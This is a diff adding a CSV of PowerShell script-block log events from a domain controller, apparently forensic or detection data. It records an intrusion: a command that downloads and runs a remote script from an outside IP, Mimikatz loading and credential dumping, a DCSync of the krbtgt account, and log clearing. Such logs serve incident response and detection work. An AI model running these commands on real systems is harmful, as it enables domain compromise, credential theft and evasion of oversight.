@@ -1,0 +1,7 @@
+"TimeCreated","Id","MachineName","Message"
+"27.10.2026 02:20:05","4104","DC01.corp.local","Creating Scriptblock text (1 of 1): | IEX (New-Object Net.WebClient).DownloadString('http://103.148.72.41:8080/a.ps1') | ScriptBlock ID: 6f1c2d4e-0b7a-4e11-9a3d-2c5e8f0a1b01"
+"27.10.2026 02:20:07","4104","DC01.corp.local","Creating Scriptblock text (1 of 412): | function Invoke-Mimikatz { [CmdletBinding(DefaultParameterSetName=""DumpCreds"")] Param( [...] ) [...] | ScriptBlock ID: 8d2e4f60-3c1b-4a77-b5e9-7a0c1d2e3f02"
+"27.10.2026 02:20:31","4104","DC01.corp.local","Creating Scriptblock text (1 of 1): | Invoke-Mimikatz -Command '""privilege::debug"" ""sekurlsa::logonpasswords"" ""exit""' | ScriptBlock ID: 1a2b3c4d-5e6f-4a7b-8c9d-0e1f2a3b4c03"
+"27.10.2026 02:26:44","4104","DC01.corp.local","Creating Scriptblock text (1 of 1): | Invoke-Mimikatz -Command '""lsadump::dcsync /domain:corp.local /user:krbtgt"" ""exit""' | ScriptBlock ID: 4c5d6e7f-8a9b-4c0d-9e1f-2a3b4c5d6e04"
+"27.10.2026 02:40:02","4104","DC01.corp.local","Creating Scriptblock text (1 of 1): | Clear-EventLog -LogName 'Windows PowerShell' | ScriptBlock ID: 7f8a9b0c-1d2e-4f3a-8b4c-5d6e7f8a9b05"
+"26.10.2026 10:14:22","4104","DC01.corp.local","Creating Scriptblock text (1 of 1): | Get-ADUser -Filter * -Properties LastLogonDate | Select Name,LastLogonDate | ScriptBlock ID: 2b3c4d5e-6f7a-4b8c-9d0e-1f2a3b4c5d06"
